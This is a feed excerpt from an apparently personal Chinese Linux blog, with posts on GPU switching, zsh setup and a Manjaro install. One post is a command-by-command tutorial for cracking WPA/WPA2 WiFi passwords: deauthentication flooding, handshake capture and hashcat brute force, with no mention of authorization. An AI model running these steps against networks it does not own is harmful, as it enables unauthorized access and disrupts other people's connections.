    <content type="html"><![CDATA[<h2 id="Bumblebee"><a href="#Bumblebee" class="headerlink" title="Bumblebee"></a>Bumblebee</h2><p><a href="https://github.com/Bumblebee-Project/Bumblebee" target="_blank" rel="noopener">Bumblebee</a>是一套Linux下双显卡切换的解决方案，通过它可以自由的切换集显与独立显卡，做到续航与性能的平衡。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>Manjaro 提供了强大的硬件检测模块<code>mhwd</code>,可以很方便的安装各种驱动。</p><ul><li>安装依赖<blockquote><p>sudo pacman -S virtualgl lib32-virtualgl lib32-primus primus</p></blockquote></li><li>安装nvidia闭源驱动与intel驱动混合版bumblebee<blockquote><p>sudo mhwd -f -i pci video-hybrid-intel-nvidia-bumblebee</p></blockquote></li></ul><a id="more"></a><ul><li>开启自动启动bumblebeed服务<blockquote><p>sudo systemctl enable bumblebeed</p></blockquote></li><li>将用户添加到bumblee组<blockquote><p>sudo gpasswd -a $USER bumblebee</p></blockquote></li></ul><p>如果一切顺利的话，重启后就可以在你想运行的程序名前面加<code>optirun</code>,好使用独立显卡驱动你的应用程序。</p><ul><li>但很大可能是重启后发现无法进入图形化界面,你可以尝试在Grub菜单启动界面按[E]编辑，找到<code>quite</code>并在后面加入(注意空格):<blockquote><p>acpi_osi=! acpi_osi=’Windows 2009’<br>或者<br>acpi_osi=! acpi_osi=Linux acpi_osi=’Windows 2015’ pcie_port_pm=off<br><strong>(很多硬件厂商的BIOS驱动都对Linux不友好，无法顺利加载ACPI模块，而导致无法驱动独立显卡,acpi_osi=’Windows 2009’的意思是告诉ACPI模块，我是‘Windows 7’，别闹情绪了，赶紧工作吧。)</strong><br>接着按[Ctrl]+[x]或[F10]保存更改并启动系统。</p></blockquote></li><li>顺利进入系统后打开终端更改配置文件<blockquote><p>sudo vim /etc/default/grub</p></blockquote></li><li>给 “GRUB_CMLINE_LINUX_DEFAULT”添加你可以正常启动Linux的‘acpi_osi’参数，如图我用的是’Windows 2009’。<br><img src="/img/manjaro_grub.png" alt="Grub"></li><li>更新Grub文件,即可永久解决不能启动图形界面的问题<blockquote><p>sudo update-grub</p></blockquote></li></ul><h2 id="测试性能"><a href="#测试性能" class="headerlink" title="测试性能"></a>测试性能</h2><ul><li>安装测试软件<blockquote><p>sudo pacman -S mesa-demos</p></blockquote></li><li>集显性能<blockquote><p>glxgears -info</p></blockquote></li><li>独显性能<blockquote><p>optirun glxgears -info</p></blockquote></li></ul><h2 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h2><ul><li><p>NVIDIA面板无信息</p><blockquote><p>optirun -b none nvidia-settings -c :8</p></blockquote></li><li><p>不依赖Bumblebee来使用CUDA</p><blockquote><p>sudo tee /proc/acpi/bbswitch &lt;&lt;&lt; ‘ON’</p></blockquote></li><li>使用完CUDA 停止NVIDIA显卡<blockquote><p>sudo rmmod nvidia_uvm nvidia &amp;&amp; sudo tee /proc/acpi/bbswitch &lt;&lt;&lt; OFF</p></blockquote></li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://gist.github.com/Misairu-G/616f7b2756c488148b7309addc940b28" target="_blank" rel="noopener">https://gist.github.com/Misairu-G/616f7b2756c488148b7309addc940b28</a></li><li><a href="https://wiki.manjaro.org/index.php?title=Configure_NVIDIA_(non-free)_settings_and_load_them_on_Startup" target="_blank" rel="noopener">https://wiki.manjaro.org/index.php?title=Configure_NVIDIA_(non-free)_settings_and_load_them_on_Startup</a></li><li><a href="https://wiki.archlinux.org/index.php/Bumblebee#Primusrun" target="_blank" rel="noopener">https://wiki.archlinux.org/index.php/Bumblebee#Primusrun</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Bumblebee&quot;&gt;&lt;a href=&quot;#Bumblebee&quot; class=&quot;headerlink&quot; title=&quot;Bumblebee&quot;&gt;&lt;/a&gt;Bumblebee&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/Bumblebee-Project/Bumblebee&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Bumblebee&lt;/a&gt;是一套Linux下双显卡切换的解决方案，通过它可以自由的切换集显与独立显卡，做到续航与性能的平衡。&lt;/p&gt;
&lt;h2 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;安装&quot;&gt;&lt;/a&gt;安装&lt;/h2&gt;&lt;p&gt;Manjaro 提供了强大的硬件检测模块&lt;code&gt;mhwd&lt;/code&gt;,可以很方便的安装各种驱动。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;安装依赖&lt;blockquote&gt;
&lt;p&gt;sudo pacman -S virtualgl lib32-virtualgl lib32-primus primus&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;安装nvidia闭源驱动与intel驱动混合版bumblebee&lt;blockquote&gt;
&lt;p&gt;sudo mhwd -f -i pci video-hybrid-intel-nvidia-bumblebee&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="http://yoursite.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>使用Aircrack&amp;hashcat破解WPA/WPA2</title>
    <link href="http://yoursite.com/2018/03/15/aircrack-hashcat/"/>
    <id>http://yoursite.com/2018/03/15/aircrack-hashcat/</id>
    <published>2018-03-15T11:45:11.000Z</published>
    <updated>2018-03-20T08:00:21.317Z</updated>
    
    <content type="html"><![CDATA[<p>====================</p><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>这里假定你用的是Manjaro Linux 系统，<a href="/2018/03/19/Bumblebee/">配置好独立显卡</a>，本文提到的软件可以直接用<code>sudo pacman -S aircrack-ng hashcat hashcat-utils</code>安装,Kali Linux默认集成，其他环境请自行安装。</p><ul><li>aircrack-ng:<br><a href="https://www.aircrack-ng.org/doku.php" target="_blank" rel="noopener">aircrack-ng</a>是目前最热门的WiFi破解领域的软件。Aircrack-ng 套件包含的工具能够捕捉数据包和握手包，生成通信数据，或进行暴力破解攻击以及字典攻击。</li><li>hashcat:<br><a href="https://hashcat.net/wiki/" target="_blank" rel="noopener">hashcat</a>支持N多种算法，充分利用GPU性能，是目前最快的利用GPU破解Hash的软件。</li><li>USB无线网卡:<br>推荐3070，8187，便宜好用（某宝十几块钱就能买到）,当然笔记本自带的无线网卡也可以。</li></ul><p>由于hashcat使用GPU破解，因此需要安装依赖，<code>sudo pacman -S ocl-icd opencl-nvidia</code>,执行<br><code>sudo tee /proc/acpi/bbswitch &lt;&lt;&lt; ON</code>以让CUDA程序使用英伟达独立显卡。</p><a id="more"></a><blockquote><p>hashcat -I<br><img src="/img/hashcat.png" alt="hashcat"><br>看到你的独显信息就可以愉快的使用hashcat了。</p></blockquote><h2 id="Aircrack"><a href="#Aircrack" class="headerlink" title="Aircrack"></a>Aircrack</h2><ul><li><p>查看无线网卡，我的网卡为wlan0</p><blockquote><p>airmon-ng<br><img src="/img/aircrack_mon.png" alt="airmon"></p></blockquote></li><li><p>将网卡设为监听模式</p><blockquote><p>airmon-ng start wlan0<br>执行<code>iwconfig</code>出现<code>Mode:Monitor</code>即执行成功，并可以看到网卡被重命名为<code>wlan0mon</code>。<br>若执行失败，请先尝试<code>airmon-ng check kill</code>，依旧不行，请检查你的网卡驱动是否被<a href="https://wireless.wiki.kernel.org/en/users/drivers" target="_blank" rel="noopener">支持</a><br><img src="/img/aircrack_iw.png" alt="iwconfig"></p></blockquote></li><li><p>搜索目标</p><blockquote><p>airodump-ng wlan0mon<br><img src="/img/aircrack_dump.png" alt="airdump"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BSSID:无线路由的MAC地址</span><br><span class="line">PWR：无线信号强度（绝对值越小表示信号越强）</span><br><span class="line">CH:信道号</span><br><span class="line">ENC:加密体系，常见WPA，WPA2，WEP</span><br><span class="line">ESSID:扩展路由名称</span><br></pre></td></tr></table></figure></blockquote></li><li><p>这里以ELJNB为例，进行抓包：</p><blockquote><p>airodump-ng –bssid DC:FE:18:C4:20:E3 -o pcap -w my -c 1 wlan0mon</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--bssid: 指定无线路由的MAC地址,这里是ELJNB的MAC地址</span><br><span class="line">-o:指定输出文件格式， 支持pcap, ivs, csv, gps, kismet, netxml</span><br><span class="line">-w:保存文件名称，会自动加01，02，03作为序号。</span><br><span class="line">-c:指定工作频道，ELJNB工作在频道1</span><br><span class="line">最后是你的网卡接口名称</span><br></pre></td></tr></table></figure></blockquote></li></ul><p><img src="/img/aircrack_replay.png" alt="replay"><br>注意<code>STATION</code>那列里的MAC地址，稍后会用到，并保持airodump-ng一直处于运行状态。</p><ul><li>加速获取握手包<br>我们可以使用泛洪攻击断开某设备的连接，迫使其重连,以顺利捕获我们需要的数据（含有WiFi的密码数据包）。新开一个终端，输入<blockquote><p>aireplay-ng –deauth 1 –a DC:FE:18:C4:20:E3 -c E6:20:3A:A4:82:10 wlan0mon</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--deauth:取消验证洪水攻击，后面是攻击次数，0代表无限次数。</span><br><span class="line">-a:目标路由MAC地址</span><br><span class="line">-c:连到这个路由某的设备MAC地址，可以在STATION那列中随便选一个。</span><br></pre></td></tr></table></figure></blockquote></li></ul><p>回到airodump-ng窗口,若在右上角发现<code>WPA handshake</code> ，即成功捕获数据。若不成功请多试几次。<br><img src="/img/aircrack_wpa.png" alt="handskake"><br>顺利捕获数据后就可以用<code>Ctrl+C</code>终止airodump-ng了。会发现它在当前路径生成了一个my-01.cap文件，现在可以进行最后一步,破解数据了。</p><ul><li>暴力破解<ul><li>在线破解：<a href="https://www.onlinehashcrack.com/wifi-wpa-rsna-psk-crack.php" target="_blank" rel="noopener">Online Hash Crack</a>  <a href="https://gpuhash.me/" target="_blank" rel="noopener">GPUHASH.me</a>  <a href="http://www.md5this.com/tools/wpa-wpa2-password-crack.html" target="_blank" rel="noopener">md5this</a></li><li>本地破解:<br><code>aircrack-ng -w dict.txt my-01.cap</code><br>这里破解速度就取决与你CPU性能和字典文件(dict.txt)够不够强大了。<br>如果需要，可以从网上找一些<a href="https://github.com/conwnet/wpa-dictionary" target="_blank" rel="noopener">字典文件</a><br>aircrack-ng使用CPU破解，效率比较低，这里推荐hashcat，它可以使用GPU加速你的破解过程。</li></ul></li></ul><h2 id="haschcat"><a href="#haschcat" class="headerlink" title="haschcat"></a>haschcat</h2><p>hashcat需要特殊的hash数据包格式，因此需要先将airodump-ng抓取的数据包转换一下，<a href="https://hashcat.net/cap2hccapx/" target="_blank" rel="noopener">在线转换</a>或本地使hashcat-utils所提供的工具包</p><ul><li><p>用cap2hccapx将cap转化为hccapx<br><img src="/img/cap2hccapx.png" alt="cap2hcc"></p></li><li><p>开始暴力破解</p><blockquote><p>hashcat -m 2500  test.hccapx dict.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-m:hash类型 2500 为wpa/wpa2</span><br><span class="line">test.hccapx:数据包文件</span><br><span class="line">dict.txt:为字典文件</span><br></pre></td></tr></table></figure></blockquote></li></ul><p><img src="/img/hashcat_gpu.png" alt="hashcat"><br>破解结束后，查看结果</p><blockquote><p>cat ～/.hashcat/hashcat.porifle<br><img src="/img/hashcat_pro.png" alt="result"><br>最后即为WiFi密码，关于hashcat高级使用方式，见<a href="http://wps2015.org/drops/drops/GPU%E7%A0%B4%E8%A7%A3%E7%A5%9E%E5%99%A8Hashcat%E4%BD%BF%E7%94%A8%E7%AE%80%E4%BB%8B.html" target="_blank" rel="noopener">wooyun</a></p></blockquote><h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p>可以看到，整个过程无非两步，第一步抓取<code>WPA handshake</code>数据包，第二步暴力破解数据文件。因此<br>可以使用更强大的工具<code>wlandump-ng</code>：一次性从附近的网络上抓取所有的 handshake 信息，而实现快速破解WiFi,详情见<a href="https://github.com/brannondorsey/wifi-cracking/blob/master/appendix.zh.md" target="_blank" rel="noopener">wifi-cracking</a>和<a href="https://github.com/ZerBea/hcxtools" target="_blank" rel="noopener">hcxtools</a></p><p><strong>最大的安全隐患永远是人</strong>，优先使用WiFi万能钥匙也许会有意外惊喜(配合手机自带的WiFi分享功能，可以直接得到密码)。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.bennythink.com/wifi-cracking.html" target="_blank" rel="noopener">https://www.bennythink.com/wifi-cracking.html</a></li><li><a href="https://klionsec.github.io/2015/04/14/aircrack-hascat/" target="_blank" rel="noopener">https://klionsec.github.io/2015/04/14/aircrack-hascat/</a></li><li><a href="http://byd.dropsec.xyz/2016/08/10/HashCat%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/" target="_blank" rel="noopener">http://byd.dropsec.xyz/2016/08/10/HashCat%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/</a></li><li><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=21342&amp;highlight=wifi" target="_blank" rel="noopener">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=21342&amp;highlight=wifi</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;====================&lt;/p&gt;
&lt;h2 id=&quot;写在前面&quot;&gt;&lt;a href=&quot;#写在前面&quot; class=&quot;headerlink&quot; title=&quot;写在前面&quot;&gt;&lt;/a&gt;写在前面&lt;/h2&gt;&lt;p&gt;这里假定你用的是Manjaro Linux 系统，&lt;a href=&quot;/2018/03/19/Bumblebee/&quot;&gt;配置好独立显卡&lt;/a&gt;，本文提到的软件可以直接用&lt;code&gt;sudo pacman -S aircrack-ng hashcat hashcat-utils&lt;/code&gt;安装,Kali Linux默认集成，其他环境请自行安装。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;aircrack-ng:&lt;br&gt;&lt;a href=&quot;https://www.aircrack-ng.org/doku.php&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;aircrack-ng&lt;/a&gt;是目前最热门的WiFi破解领域的软件。Aircrack-ng 套件包含的工具能够捕捉数据包和握手包，生成通信数据，或进行暴力破解攻击以及字典攻击。&lt;/li&gt;
&lt;li&gt;hashcat:&lt;br&gt;&lt;a href=&quot;https://hashcat.net/wiki/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;hashcat&lt;/a&gt;支持N多种算法，充分利用GPU性能，是目前最快的利用GPU破解Hash的软件。&lt;/li&gt;
&lt;li&gt;USB无线网卡:&lt;br&gt;推荐3070，8187，便宜好用（某宝十几块钱就能买到）,当然笔记本自带的无线网卡也可以。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;由于hashcat使用GPU破解，因此需要安装依赖，&lt;code&gt;sudo pacman -S ocl-icd opencl-nvidia&lt;/code&gt;,执行&lt;br&gt;&lt;code&gt;sudo tee /proc/acpi/bbswitch &amp;lt;&amp;lt;&amp;lt; ON&lt;/code&gt;以让CUDA程序使用英伟达独立显卡。&lt;/p&gt;
    
    </summary>
    
    
      <category term="WiFi" scheme="http://yoursite.com/tags/WiFi/"/>
    
  </entry>
  
  <entry>
    <title>终端环境之Zsh＆oh-my-zsh</title>
    <link href="http://yoursite.com/2018/03/14/oh-my-zsh/"/>
    <id>http://yoursite.com/2018/03/14/oh-my-zsh/</id>
    <published>2018-03-14T01:41:21.000Z</published>
    <updated>2018-03-17T12:56:49.017Z</updated>
    
    <content type="html"><![CDATA[<p>==============</p><h2 id="终极-Shell-zsh"><a href="#终极-Shell-zsh" class="headerlink" title="终极 Shell(zsh)"></a>终极 Shell(zsh)</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><ul><li>Z Shell(Zsh) 是一种Unix shell，它可以用作为交互式的登录shell，也是一种强大的shell脚本命令解释器。它在兼容 Bash 的同时 (默认不兼容，除非设置成 emulate sh) 还提供了很多改进。</li><li>改进特性:<ul><li>色彩高亮</li><li>更强大的自动补全</li><li>支持通配符搜索</li><li>兼容Bash</li><li>完全可定制化</li></ul></li></ul><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><blockquote><p>sudo pacman -S zsh zsh-completions</p></blockquote><p>此处为Arch Linux，其他平台请使用自带的包管理器，为了使用更强大的补全功能建议同时安装 zsh-completions包</p><a id="more"></a><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><ul><li>将zsh设为默认shell<blockquote><p>chsh -s /bin/zsh</p></blockquote></li><li>其他发行版可先用chsh -l 查看zsh安装位置</li></ul><h2 id="Oh-my-zsh"><a href="#Oh-my-zsh" class="headerlink" title="Oh-my-zsh"></a>Oh-my-zsh</h2><ul><li>curl 和 git 应该已被安装(若没有Arch 用sudo pacman -S curl git 安装，其他发行版类似。)</li><li><a href="http://ohmyz.sh" target="_blank" rel="noopener">Oh-my-zsh</a>是一个傻瓜化的zsh配置管理框架，提供了大量实用的功能，主题等。做到开箱即用，现在基本成为了Zsh的标配。</li><li><p>安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c <span class="string">"<span class="variable">$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)</span>"</span></span><br></pre></td></tr></table></figure></li><li><p>配置文件位置： ~/.zshrc</p></li><li><p>主题<br>oh-my-zsh自带大量<a href="https://github.com/robbyrussell/oh-my-zsh/wiki/Themes" target="_blank" rel="noopener">Themes</a>，默认为robbyrussell。你也可以选择random，即每次打开终端随机选一个主题。</p><blockquote><p>ZSH_THEME=”你喜欢的主题名”<br><img src="/img/zsh_theme.png" alt="themes"></p></blockquote></li><li><p>常用插件</p><ul><li>git: 提供大量git的Aliases，<a href="https://github.com/robbyrussell/oh-my-zsh/wiki/Plugin:git" target="_blank" rel="noopener">详情</a></li><li>archlinux： 提供一些pacman包管理器的Aliases，<a href="https://github.com/robbyrussell/oh-my-zsh/wiki/Plugins#archlinux" target="_blank" rel="noopener">详情</a></li><li>z：经常使用cd 切换路径，积累一定数据后可用z快速跳转到指定位置</li><li>sudo：按两次[Esc]自动在前面加sudo</li><li>pip： 补全pip 命令</li><li><p>zsh-autosuggestions: 根据历史记录进行智能提示(按 ctrl+E 是正确姿势)。非oh-my-zsh自带，用git下载安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions <span class="variable">$ZSH_CUSTOM</span>/plugins/zsh-autosuggestions</span><br></pre></td></tr></table></figure></li><li><p>zsh-syntax-highlighting：命令高亮，正确显示绿色，错误为红色。非oh-my-zsh自带，用git下载安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-syntax-highlighting</span><br></pre></td></tr></table></figure><blockquote><p>plugins=( 你想启用的插件，空格分隔 )<br><img src="/img/zsh_plugins.png" alt="plugins"></p></blockquote></li><li>重新加载配置文件，立刻生效。<blockquote><p>source ~/.zshrc</p></blockquote></li></ul></li><li>其他插件请参见官方<a href="https://github.com/robbyrussell/oh-my-zsh/wiki/Plugins-Overview" target="_blank" rel="noopener">wiki</a></li><li>少即是多，启用大量插件会严重拖慢zsh启动速度</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://wiki.archlinux.org/index.php/Zsh_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)" target="_blank" rel="noopener">https://wiki.archlinux.org/index.php/Zsh_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)</a></li><li><a href="http://zsh.sourceforge.net/FAQ/zshfaq01.html#l4" target="_blank" rel="noopener">http://zsh.sourceforge.net/FAQ/zshfaq01.html#l4</a></li><li><a href="https://en.wikipedia.org/wiki/Z_shell" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Z_shell</a></li><li><a href="http://macshuo.com/?p=676" target="_blank" rel="noopener">http://macshuo.com/?p=676</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;==============&lt;/p&gt;
&lt;h2 id=&quot;终极-Shell-zsh&quot;&gt;&lt;a href=&quot;#终极-Shell-zsh&quot; class=&quot;headerlink&quot; title=&quot;终极 Shell(zsh)&quot;&gt;&lt;/a&gt;终极 Shell(zsh)&lt;/h2&gt;&lt;h3 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Z Shell(Zsh) 是一种Unix shell，它可以用作为交互式的登录shell，也是一种强大的shell脚本命令解释器。它在兼容 Bash 的同时 (默认不兼容，除非设置成 emulate sh) 还提供了很多改进。&lt;/li&gt;
&lt;li&gt;改进特性:&lt;ul&gt;
&lt;li&gt;色彩高亮&lt;/li&gt;
&lt;li&gt;更强大的自动补全&lt;/li&gt;
&lt;li&gt;支持通配符搜索&lt;/li&gt;
&lt;li&gt;兼容Bash&lt;/li&gt;
&lt;li&gt;完全可定制化&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;安装&quot;&gt;&lt;/a&gt;安装&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;sudo pacman -S zsh zsh-completions&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;此处为Arch Linux，其他平台请使用自带的包管理器，为了使用更强大的补全功能建议同时安装 zsh-completions包&lt;/p&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="http://yoursite.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>笔记本安装 Manjaro Linux</title>
    <link href="http://yoursite.com/2018/03/09/archlinuxcn/"/>
    <id>http://yoursite.com/2018/03/09/archlinuxcn/</id>
    <published>2018-03-09T08:07:36.000Z</published>
    <updated>2018-03-19T14:53:48.380Z</updated>
    
    <content type="html"><![CDATA[<p>====================</p><h2 id="Manjaro简介"><a href="#Manjaro简介" class="headerlink" title="Manjaro简介"></a>Manjaro简介</h2><p><a href="https://manjaro.org/" target="_blank" rel="noopener">Manjaro Linux</a>是一款基于Arch Linux、对用户友好、全球排名第2的Linux发行版。（数据来自<a href="https://distrowatch.com/" target="_blank" rel="noopener">DistroWatch</a>），它的一些显著特性包括：简化、用户友好的安装过程，自动检测计算机的硬件（例如显卡），为系统自动安装必要的软件（例如显卡驱动程序），它有自己的专用软件仓库和更稳定的软件包、可以轻松安装和使用多个内核。</p><h2 id="无法进入安装程序"><a href="#无法进入安装程序" class="headerlink" title="无法进入安装程序"></a>无法进入安装程序</h2><ul><li>如果自动图形界面启动不了，卡在以下位置：<ol><li>Started TLP system startup/shutdown</li><li>A start job is running for livemedia mhwd scripe(xx s/no limit)</li></ol></li><li>可尝试添加内核参数<br>  看到启动菜单,用方向键移动选中boot项，按[E]键编辑<br>  把driver=free改为driver=intel，并在后面添加acpi_osi参数，最后效果如下:<blockquote><p>driver=intel xdriver=mesa acpi_osi=! acpi_osi=’Windows 2009’  </p></blockquote></li><li>修改完成后按[F10]启动，并完成安装。</li></ul><a id="more"></a><h2 id="配置-archlinuxcn-源"><a href="#配置-archlinuxcn-源" class="headerlink" title="配置 archlinuxcn 源"></a>配置 archlinuxcn 源</h2><h3 id="archlinuxcn-简介"><a href="#archlinuxcn-简介" class="headerlink" title="archlinuxcn 简介"></a>archlinuxcn 简介</h3><p>Arch Linux <a href="https://www.archlinuxcn.org/archlinux-cn-repo-and-mirror/" target="_blank" rel="noopener">中文社区仓库</a> 是由 Arch Linux 中文社区驱动的非官方用户仓库。包含大量中文用户常用软件、工具、字体/美化包等。</p><h3 id="启用archlinuxcn库"><a href="#启用archlinuxcn库" class="headerlink" title="启用archlinuxcn库"></a>启用archlinuxcn库</h3><ul><li>修改配置文件<blockquote><p>sudo nano /etc/pacman.conf</p></blockquote></li><li>在文末添加<blockquote><p>[archlinuxcn]<br>Server = <a href="https://mirrors.zju.edu.cn/archlinuxcn/$arch" target="_blank" rel="noopener">https://mirrors.zju.edu.cn/archlinuxcn/$arch</a></p></blockquote></li><li>添加PGP密钥<blockquote><p>sudo pacman -Syy &amp;&amp; sudo pacman -S archlinuxcn-keyring</p></blockquote></li></ul><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><blockquote><p>sudo pacman -S yaourt</p></blockquote><ul><li>以后就可以直接使用 yaourt softname 搜索并安装AUR库中的软件。</li></ul><h2 id="安装中文输入法"><a href="#安装中文输入法" class="headerlink" title="安装中文输入法"></a>安装中文输入法</h2><ul><li>推荐Rime<blockquote><p>sudo pacman -S fcitx-im fcitx-configtool fcitx-rime</p></blockquote></li></ul><p><a href="https://github.com/xiaoTaoist/rime-dict" target="_blank" rel="noopener">Rime扩展增强词库</a></p><ul><li>创建配置文件<blockquote><p>vim ~/.xprofile </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export GTK_IM_MODULE=fcitx</span><br><span class="line">export QT_IM_MODULE=fcitx</span><br><span class="line">export XMODIFIERS=&quot;@im=fcitx&quot;</span><br></pre></td></tr></table></figure></blockquote></li></ul><p>注销生效</p><h2 id="其他常用软件"><a href="#其他常用软件" class="headerlink" title="其他常用软件"></a>其他常用软件</h2><ul><li>albert: 谁用谁知道的效率增强神器</li><li>chromium: Chrome浏览器</li><li>deepin-wechat: Linux下微信解决方案</li><li>goldendict: 功能强大的词典软件</li><li>keepassxc: 跨平台的本地密码管理器</li><li>noto-fonts-cjk: 中文字体，当然还有文泉系列(wqy-microhei)</li><li>proxychains-ng: 你懂的</li><li>virtualbox: 开源、轻巧，快速的虚拟机软件</li><li>zsh: 人生苦短，我用zsh</li><li>vlc：本地媒体播放器</li><li>visual-studio-code-bin： 微软发布的开源代码编辑器，支持多种语言。</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;====================&lt;/p&gt;
&lt;h2 id=&quot;Manjaro简介&quot;&gt;&lt;a href=&quot;#Manjaro简介&quot; class=&quot;headerlink&quot; title=&quot;Manjaro简介&quot;&gt;&lt;/a&gt;Manjaro简介&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://manjaro.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Manjaro Linux&lt;/a&gt;是一款基于Arch Linux、对用户友好、全球排名第2的Linux发行版。（数据来自&lt;a href=&quot;https://distrowatch.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;DistroWatch&lt;/a&gt;），它的一些显著特性包括：简化、用户友好的安装过程，自动检测计算机的硬件（例如显卡），为系统自动安装必要的软件（例如显卡驱动程序），它有自己的专用软件仓库和更稳定的软件包、可以轻松安装和使用多个内核。&lt;/p&gt;
&lt;h2 id=&quot;无法进入安装程序&quot;&gt;&lt;a href=&quot;#无法进入安装程序&quot; class=&quot;headerlink&quot; title=&quot;无法进入安装程序&quot;&gt;&lt;/a&gt;无法进入安装程序&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;如果自动图形界面启动不了，卡在以下位置：&lt;ol&gt;
&lt;li&gt;Started TLP system startup/shutdown&lt;/li&gt;
&lt;li&gt;A start job is running for livemedia mhwd scripe(xx s/no limit)&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;可尝试添加内核参数&lt;br&gt;  看到启动菜单,用方向键移动选中boot项，按[E]键编辑&lt;br&gt;  把driver=free改为driver=intel，并在后面添加acpi_osi参数，最后效果如下:&lt;blockquote&gt;
&lt;p&gt;driver=intel xdriver=mesa acpi_osi=! acpi_osi=’Windows 2009’  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;修改完成后按[F10]启动，并完成安装。&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="http://yoursite.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>SSH免密登录</title>
    <link href="http://yoursite.com/2018/03/07/ssh-keygen/"/>
    <id>http://yoursite.com/2018/03/07/ssh-keygen/</id>
    <published>2018-03-07T01:37:50.000Z</published>
    <updated>2018-03-31T02:21:41.844Z</updated>
    
